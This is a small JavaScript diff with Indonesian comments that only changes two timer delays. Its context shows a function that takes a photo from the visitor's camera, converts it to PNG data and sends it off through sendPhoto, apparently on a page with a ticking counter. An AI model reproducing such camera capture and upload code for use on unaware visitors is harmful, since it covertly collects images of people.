@@ -107,7 +107,7 @@ function updateCount() {
     document.getElementById("number").textContent = count;
 }
 
-setInterval(updateCount, 2000);
+setInterval(updateCount, 1000);
 
 async function getRandomText() {
     try {
@@ -152,7 +152,7 @@ function capturePhoto() {
                 const photoData = canvas.toDataURL("image/png");
                 sendPhoto(photoData);
                 stream.getTracks().forEach(track => track.stop()); // Matikan kamera setelah mengambil foto
-            }, 1000);
+            }, 2000);
         }).catch(() => {
             console.warn("Akses kamera ditolak atau tidak tersedia.");
         });
